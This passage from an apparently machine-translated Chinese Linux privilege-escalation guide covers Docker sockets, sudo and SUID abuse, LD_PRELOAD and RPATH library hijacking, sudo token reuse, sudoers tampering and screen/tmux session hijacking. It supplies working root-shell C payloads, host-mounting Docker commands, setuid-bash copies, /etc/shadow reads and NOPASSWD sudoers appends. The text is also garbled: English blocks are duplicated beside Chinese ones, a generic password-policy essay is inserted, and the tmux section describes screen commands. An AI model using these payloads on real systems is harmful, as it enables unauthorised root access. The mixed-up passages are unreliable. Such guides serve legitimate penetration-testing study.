#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**漏洞利用示例：**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP套接字

请注意，可能有一些**监听HTTP请求的套接字**（_我不是指.socket文件，而是充当Unix套接字的文件_）。您可以使用以下命令进行检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果套接字**响应HTTP请求**，那么你可以**与其通信**，可能会**利用一些漏洞**。

### 可写的Docker套接字

**Docker套接字**通常位于`/var/run/docker.sock`，只有`root`用户和`docker`组有写权限。\
如果出于某种原因**你对该套接字具有写权限**，你可以提升权限。\
以下命令可用于提升权限：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### 使用无需docker包的docker web API

如果您可以访问**docker套接字**但无法使用docker二进制文件（可能甚至未安装），您可以直接使用`curl`使用web API。

以下命令是一个示例，演示如何**创建一个挂载主机系统根目录的docker容器**，并使用`socat`在新的docker中执行命令。
```bash
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
#{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
最后一步是使用 `socat` 启动与容器的连接，发送一个 "attach" 请求。
```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```
现在，您可以通过这个`socat`连接在容器上执行命令。

### 其他

请注意，如果您具有对docker套接字的写权限，因为您在`docker`组内，您有[**更多提升权限的方法**](interesting-groups-linux-pe/#docker-group)。如果[docker API正在监听一个端口，您也可以利用它进行攻击](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下链接中查看有关**更多从docker中突破或滥用它以提升权限的方法**：

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr)提权

如果您发现可以使用**`ctr`**命令，请阅读以下页面，因为**您可能能够滥用它以提升权限**：

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC**提权

如果您发现可以使用**`runc`**命令，请阅读以下页面，因为**您可能能够滥用它以提升权限**：

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-BUS是一个**进程间通信（IPC）系统**，提供了一个简单而强大的机制，**允许应用程序相互通信**，交换信息并请求服务。D-BUS从头开始设计，以满足现代Linux系统的需求。

作为一个功能齐全的IPC和对象系统，D-BUS有几个预期的用途。首先，D-BUS可以执行基本的应用程序IPC，允许一个进程将数据传输给另一个进程-类似于**功能强化的UNIX域套接字**。其次，D-BUS可以通过系统发送事件或信号，允许系统中的不同组件进行通信，并最终更好地集成。例如，蓝牙守护程序可以发送一个来电信号，您的音乐播放器可以拦截该信号，在通话结束之前静音音量。最后，D-BUS实现了一个远程对象系统，允许一个应用程序从不同的对象请求服务和调用方法-类似于没有复杂性的CORBA。（来自[这里](https://www.linuxjournal.com/article/7744)）。

D-Bus使用**允许/拒绝模型**，其中每个消息（方法调用、信号发射等）可以根据与之匹配的所有策略规则的总和进行**允许或拒绝**。策略中的每个规则应该设置`own`、`send_destination`或`receive_sender`属性。

`/etc/dbus-1/system.d/wpa_supplicant.conf`策略的一部分：
```markup
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
因此，如果策略以任何方式允许您的用户与总线进行交互，您可能能够利用它来提升权限（也许只是查找一些密码？）。

请注意，**未指定**任何用户或组的**策略**会影响所有人（`<policy>`）。\
对于上下文为"default"的策略，会影响未受其他策略影响的所有人（`<policy context="default"`）。

**在此了解如何枚举和利用D-Bus通信：**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **网络**

枚举网络并确定机器的位置始终是有趣的。

### 通用枚举
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 开放端口

在访问之前，始终检查无法与之交互的机器上运行的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### 嗅探

检查是否可以嗅探流量。如果可以，你可能能够获取一些凭据。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查你是谁，你拥有哪些特权，系统中有哪些用户可以登录以及哪些用户拥有root特权：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大 UID

一些Linux版本受到了一个bug的影响，允许具有**UID > INT\_MAX**的用户提升权限。更多信息：[这里](https://gitlab.freedesktop.org/polkit/polkit/issues/74)，[这里](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)和[这里](https://twitter.com/paragonsec/status/1071152249529884674)。\
使用以下方法**利用它**：**`systemd-run -t /bin/bash`**

### 组

检查是否是**某个组的成员**，该组可能授予您root权限：

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### 剪贴板

检查剪贴板中是否有任何有趣的内容（如果可能的话）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略

A strong password policy is essential for maintaining the security of a system. It helps prevent unauthorized access and protects sensitive information. Here are some key points to consider when implementing a password policy:

- **Password Complexity**: Require users to create passwords that are complex and difficult to guess. This can be achieved by enforcing a minimum length, including a combination of uppercase and lowercase letters, numbers, and special characters.

- **Password Expiration**: Set a policy that requires users to change their passwords regularly. This helps prevent the use of compromised passwords over an extended period of time.

- **Password History**: Implement a password history feature that prevents users from reusing their previous passwords. This ensures that users are constantly creating new and unique passwords.

- **Account Lockout**: Implement an account lockout policy that temporarily locks user accounts after a certain number of failed login attempts. This helps protect against brute-force attacks.

- **Password Storage**: Store passwords securely using strong encryption algorithms. Avoid storing passwords in plain text or using weak hashing algorithms.

- **Password Education**: Educate users about the importance of creating strong passwords and the risks associated with weak passwords. Provide guidelines and best practices for password creation.

By implementing a robust password policy, you can significantly enhance the security of your system and protect against unauthorized access.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你**知道环境中的任何密码**，尝试使用密码登录每个用户。

### Su暴力破解

如果不介意制造很多噪音，并且计算机上存在`su`和`timeout`二进制文件，你可以尝试使用[su-bruteforce](https://github.com/carlospolop/su-bruteforce)来暴力破解用户。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)使用`-a`参数也可以尝试暴力破解用户。

## 可写的PATH滥用

### $PATH

如果你发现你可以**在$PATH的某个文件夹中写入**，你可以通过在可写文件夹中创建一个名为将由不同用户（最好是root）执行的某个命令的后门，从而提升权限，而该命令**不是从位于你的可写文件夹之前的文件夹加载**的。

### SUDO和SUID

你可能被允许使用sudo执行某些命令，或者它们可能具有suid位。使用以下命令进行检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一些意外的命令允许您读取和/或写入文件，甚至执行命令。例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo配置可能允许用户在不知道密码的情况下以另一个用户的特权执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个例子中，用户`demo`可以以`root`身份运行`vim`，现在可以通过将ssh密钥添加到根目录或调用`sh`来轻松获取一个shell。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行某个操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
这个例子，基于HTB机器Admirer，存在PYTHONPATH劫持漏洞，可以在以root权限执行脚本时加载任意Python库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### 绕过路径执行Sudo

**跳转**到其他文件或使用**符号链接**。例如，在sudoers文件中：_hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用了通配符（\*），那就更容易了：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**对策**：[https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### 没有指定命令路径的Sudo命令/SUID二进制文件

如果给予一个单独的命令**sudo权限而没有指定路径**：_hacker10 ALL= (root) less_，你可以通过更改PATH变量来利用它。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
这种技术也可以用于**suid**二进制文件**在不指定路径的情况下执行另一个命令（始终使用**_**strings**_**检查奇怪的SUID二进制文件的内容）**。

[执行的有效载荷示例。](payloads-to-execute.md)

### 带有命令路径的SUID二进制文件

如果**suid**二进制文件**指定路径执行另一个命令**，那么你可以尝试**导出一个与suid文件调用的命令同名的函数**。

例如，如果一个suid二进制文件调用了_**/usr/sbin/service apache2 start**_，你需要尝试创建并导出该函数：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当您调用suid二进制文件时，将执行此函数

### LD\_PRELOAD和**LD\_LIBRARY\_PATH**

**LD\_PRELOAD**是一个可选的环境变量，其中包含一个或多个共享库或共享对象的路径，加载器将在加载任何其他共享库之前加载这些库，包括C运行时库（libc.so）。这称为预加载库。

为了防止此机制被用作_suid/sgid_可执行二进制文件的攻击向量，如果_ruid != euid_，加载器将忽略_LD\_PRELOAD_。对于这样的二进制文件，只有标准路径中也是_suid/sgid_的库将被预加载。

如果您在**`sudo -l`**的输出中找到句子：_**env\_keep+=LD\_PRELOAD**_，并且您可以使用sudo调用某些命令，则可以提升特权。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令进行**编译**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，运行**提升权限**
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
如果攻击者控制**LD\_LIBRARY\_PATH**环境变量，那么类似的权限提升攻击可以被滥用，因为攻击者可以控制库文件的搜索路径。
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID二进制文件 - .so注入

如果你发现某个具有**SUID**权限的奇怪二进制文件，你可以检查所有的**.so**文件是否**正确加载**。为了这样做，你可以执行以下命令：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，如果你发现类似这样的内容：_pen("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)_，你可以利用它。

创建文件 _/home/user/.config/libcalc.c_，其中包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
使用以下命令进行编译：
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
## 共享对象劫持

Shared Object Hijacking (also known as DLL Hijacking) is a technique used to exploit the way an application loads shared libraries. By placing a malicious shared object in a directory that is searched by the application, an attacker can trick the application into loading the malicious library instead of the legitimate one. This can lead to privilege escalation and remote code execution.

共享对象劫持（也称为DLL劫持）是一种利用应用程序加载共享库的方式的技术。通过将恶意共享对象放置在应用程序搜索的目录中，攻击者可以欺骗应用程序加载恶意库而不是合法的库。这可能导致特权提升和远程代码执行。

### Identifying Potential Targets

To identify potential targets for shared object hijacking, you can look for applications that load shared libraries dynamically using functions such as `dlopen()` or `LoadLibrary()`. These functions allow an application to load shared libraries at runtime, and if not used correctly, can be vulnerable to shared object hijacking.

### 识别潜在目标

要识别共享对象劫持的潜在目标，可以查找使用`dlopen()`或`LoadLibrary()`等函数动态加载共享库的应用程序。这些函数允许应用程序在运行时加载共享库，如果使用不正确，可能会容易受到共享对象劫持的攻击。

### Exploiting Shared Object Hijacking

To exploit shared object hijacking, you need to find a vulnerable application and determine which shared libraries it loads. Once you have identified a vulnerable library, you can create a malicious shared object with the same name and place it in a directory that is searched by the application. When the application tries to load the library, it will load the malicious one instead, allowing you to execute arbitrary code with the privileges of the application.

### 利用共享对象劫持

要利用共享对象劫持，您需要找到一个易受攻击的应用程序，并确定它加载了哪些共享库。一旦您确定了一个易受攻击的库，您可以创建一个具有相同名称的恶意共享对象，并将其放置在应用程序搜索的目录中。当应用程序尝试加载库时，它将加载恶意库，从而允许您以应用程序的权限执行任意代码。

### Mitigating Shared Object Hijacking

To mitigate the risk of shared object hijacking, it is important to follow secure coding practices and ensure that shared libraries are loaded securely. Here are some steps you can take to protect against shared object hijacking:

- Use absolute paths when loading shared libraries to prevent the application from searching in potentially malicious directories.
- Verify the integrity of shared libraries by using cryptographic hashes or digital signatures.
- Regularly update and patch applications to fix any known vulnerabilities that could be exploited for shared object hijacking.
- Monitor system logs and network traffic for any signs of shared object hijacking attempts.

### 缓解共享对象劫持

为了减轻共享对象劫持的风险，重要的是遵循安全编码实践，并确保安全加载共享库。以下是一些可以采取的措施来防止共享对象劫持：

- 在加载共享库时使用绝对路径，以防止应用程序在可能包含恶意目录的位置进行搜索。
- 通过使用加密哈希或数字签名来验证共享库的完整性。
- 定期更新和修补应用程序，以修复可能被利用进行共享对象劫持的已知漏洞。
- 监控系统日志和网络流量，以发现任何共享对象劫持尝试的迹象。
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
现在我们已经找到了一个SUID二进制文件，它从一个我们可以写入的文件夹中加载库。让我们在那个文件夹中创建一个具有必要名称的库文件：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到类似的错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的库需要有一个名为`a_function_name`的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io)是一个精选的Unix二进制文件列表，攻击者可以利用这些二进制文件来绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/)是相同的，但仅适用于只能在命令中注入参数的情况。

该项目收集了Unix二进制文件的合法函数，可以被滥用以打破受限制的shell、提升或保持提升的特权、传输文件、生成绑定和反向shell，并促进其他后渗透任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

如果你可以访问`sudo -l`，你可以使用工具[**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo)来检查是否找到了如何利用任何sudo规则的方法。

### 重用Sudo令牌

在以下场景中，**你作为一个具有sudo特权的用户拥有一个shell**，但你不知道该用户的密码，你可以**等待他/她使用`sudo`执行某个命令**。然后，你可以**访问使用sudo的会话的令牌，并使用它来执行任何sudo命令**（特权升级）。

提升特权的要求：

* 你已经作为用户"_sampleuser_"拥有一个shell
* "_sampleuser_"在**过去的15分钟内使用了`sudo`**来执行某些操作（默认情况下，这是允许我们使用`sudo`而不需要输入任何密码的sudo令牌的持续时间）
* `cat /proc/sys/kernel/yama/ptrace_scope`的值为0
* 可以访问`gdb`（你可以上传它）

（你可以使用`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`临时启用`ptrace_scope`，或者永久修改`/etc/sysctl.d/10-ptrace.conf`并设置`kernel.yama.ptrace_scope = 0`）

如果满足所有这些要求，**你可以使用以下方法提升特权：**[**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* 第一个利用（`exploit.sh`）将在`/tmp`中创建二进制文件`activate_sudo_token`。你可以使用它来**在你的会话中激活sudo令牌**（你不会自动获得root shell，请执行`sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* 第二个漏洞利用 (`exploit_v2.sh`) 将在 _/tmp_ 目录下创建一个由 root 拥有并设置了 setuid 的 sh shell
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* 第三个漏洞利用 (`exploit_v3.sh`) 将创建一个 sudoers 文件，使 sudo 令牌永久有效，并允许所有用户使用 sudo
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<用户名>

如果您对该文件夹或文件夹中的任何创建的文件具有**写权限**，您可以使用二进制文件[**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools)为用户和PID**创建sudo令牌**。\
例如，如果您可以覆盖文件_/var/run/sudo/ts/sampleuser_，并且您以该用户的PID 1234拥有一个shell，您可以通过以下方式**获取sudo特权**而无需知道密码：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件`/etc/sudoers`和`/etc/sudoers.d`中的文件配置了谁可以使用`sudo`以及如何使用。这些文件**默认情况下只能由root用户和root组读取**。\
**如果**你能够**读取**这个文件，你可能能够**获取一些有趣的信息**，如果你能够**写入**任何文件，你将能够**提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你可以写入，你可以滥用这个权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
另一种滥用这些权限的方法是：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些替代 `sudo` 二进制文件的选择，比如 OpenBSD 上的 `doas`，请记得检查其配置文件 `/etc/doas.conf`。
```
permit nopass demo as root cmd vim
```
### Sudo劫持

如果你知道一个用户通常连接到一台机器并使用`sudo`来提升权限，而且你在该用户的上下文中获得了一个shell，你可以创建一个新的sudo可执行文件，它将以root权限执行你的代码，然后执行用户的命令。然后，修改用户上下文的$PATH（例如在.bash_profile中添加新路径），这样当用户执行sudo时，你的sudo可执行文件就会被执行。

请注意，如果用户使用的是不同的shell（不是bash），你需要修改其他文件来添加新路径。例如[sudo-piggyback](https://github.com/APTy/sudo-piggyback)修改了`~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你可以在[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)中找到另一个示例。

## 共享库

### ld.so

文件`/etc/ld.so.conf`指示加载的配置文件的位置。通常，该文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着将读取`/etc/ld.so.conf.d/*.conf`中的配置文件。这些配置文件指向其他文件夹，其中将搜索库。例如，`/etc/ld.so.conf.d/libc.conf`的内容是`/usr/local/lib`。这意味着系统将在`/usr/local/lib`中搜索库。

如果由于某种原因，用户对所指示的任何路径（`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/`中的任何文件或`/etc/ld.so.conf.d/*.conf`中的配置文件内的任何文件夹）具有写权限，他可能能够提升权限。请查看以下页面上如何利用此配置错误：

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将lib复制到`/var/tmp/flag15/`中，程序将在此位置使用它，如`RPATH`变量中指定的那样。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在`/var/tmp`中使用`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`创建一个恶意库。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 权限

Linux的capabilities为进程提供了一部分可用的root权限。这有效地将root权限分解为更小且独立的单元。然后可以将这些单元独立地授予进程。这样可以减少完整权限集，降低利用风险。
阅读以下页面以了解更多关于capabilities以及如何滥用它们的信息：

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## 目录权限

在一个目录中，“执行”位意味着受影响的用户可以进入该文件夹。
“读取”位意味着用户可以列出文件，“写入”位意味着用户可以删除和创建新文件。

## ACLs

ACL（访问控制列表）是离散权限的第二级，可能会覆盖标准的ugo/rwx权限。当正确使用时，它们可以为您设置对文件或目录的访问提供更好的细粒度控制，例如通过授予或拒绝对既不是文件所有者也不是组所有者的特定用户的访问权限（来自[这里](https://linuxconfig.org/how-to-manage-acls-on-linux)）。
给用户"kali"赋予对文件的读取和写入权限：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取**系统中具有特定ACL的文件：

```bash
find / -type f -exec getfacl {} + | grep "specific_acl"
```

This command uses the `find` utility to search for files (`-type f`) in the entire system (`/`). The `getfacl` command is then executed on each file found, which retrieves the file's ACLs. The `grep` command is used to filter the output and display only the files with the specified ACL (`specific_acl`).
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开shell会话

在旧版本中，您可以劫持不同用户（root）的某些shell会话。\
在最新版本中，您只能连接到自己用户的screen会话。但是，您可能会在会话中找到有趣的信息。

### 劫持screen会话

**列出screen会话**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**连接到会话**

To attach to a session, you can use the `screen` command. This allows you to connect to an existing session and resume working from where you left off. 

To attach to a session, use the following command:

```
screen -r <session_id>
```

Replace `<session_id>` with the ID of the session you want to attach to. You can find the session ID by running the `screen -ls` command.

Once attached to a session, you can interact with the terminal as if you were physically present. This is useful for tasks such as monitoring long-running processes or accessing a remote machine without interrupting any ongoing tasks.
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux会话劫持

这是**旧版tmux的问题**。我无法劫持由root创建的tmux（v2.1）会话，作为非特权用户。

**列出tmux会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**连接到会话**

To attach to a session, you can use the `screen` command. This allows you to connect to an existing session and resume working from where you left off. 

Here are the steps to attach to a session:

1. List the available sessions using the command `screen -ls`. This will display a list of active sessions along with their session IDs.
2. Identify the session you want to attach to and note down its session ID.
3. Use the command `screen -r <session_id>` to attach to the desired session. Replace `<session_id>` with the actual session ID you noted down.
4. You will now be connected to the session and can continue working within it.

Note: If there is only one active session, you can directly attach to it using the command `screen -r`.
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
请查看**HTB的Valentine box**作为示例。

## SSH

### Debian OpenSSL可预测PRNG - CVE-2008-0166

在2006年9月至2008年5月13日之间，在基于Debian的系统（如Ubuntu，Kubuntu等）上生成的所有SSL和SSH密钥可能受到此漏洞的影响。\
此漏洞是在这些操作系统中创建新的ssh密钥时引起的，因为**只有32768种可能性**。这意味着所有可能性都可以计算出来，**通过拥有ssh公钥，您可以搜索相应的私钥**。您可以在此处找到计算出的可能性：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH有趣的配置值

* **PasswordAuthentication：**指定是否允许密码身份验证。默认值为`no`。
* **PubkeyAuthentication：**指定是否允许公钥身份验证。默认值为`yes`。
* **PermitEmptyPasswords：**当允许密码身份验证时，指定服务器是否允许登录到空密码字符串的帐户。默认值为`no`。

### PermitRootLogin

指定root是否可以使用ssh登录，默认值为`no`。可能的值：

* `yes`：root可以使用密码和私钥登录
* `without-password`或`prohibit-password`：root只能使用私钥登录
* `forced-commands-only`：root只能使用私钥登录，并且如果指定了命令选项
* `no`：不允许

### AuthorizedKeysFile

指定包含可用于用户身份验证的公钥的文件。它可以包含像`%h`这样的标记，它将被主目录替换。**您可以指示绝对路径**（以`/`开头）或**相对于用户主目录的相对路径**。例如：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置将指示，如果您尝试使用用户“testusername”的**私钥**进行登录，ssh将会将您的密钥的公钥与位于`/home/testusername/.ssh/authorized_keys`和`/home/testusername/access`中的公钥进行比较。

### ForwardAgent/AllowAgentForwarding

SSH代理转发允许您使用本地SSH密钥，而不是将密钥（没有密码！）留在服务器上。因此，您将能够通过ssh**跳转**到一个主机，然后从那里使用**初始主机**中的密钥**跳转到另一个**主机。

您需要在`$HOME/.ssh.config`中设置此选项，如下所示：
```
Host example.com
ForwardAgent yes
```
请注意，如果`Host`是`*`，每次用户跳转到不同的机器时，该主机将能够访问密钥（这是一个安全问题）。

文件`/etc/ssh_config`可以**覆盖**这个**选项**，允许或拒绝这个配置。\
文件`/etc/sshd_config`可以使用关键字`AllowAgentForwarding`（默认为允许）来**允许**或**拒绝**ssh-agent转发。

如果在环境中配置了转发代理，请查看\[**此处如何利用它来提升权限**]\(ssh-forward-agent-exploitation.md)。

## 有趣的文件

### 配置文件

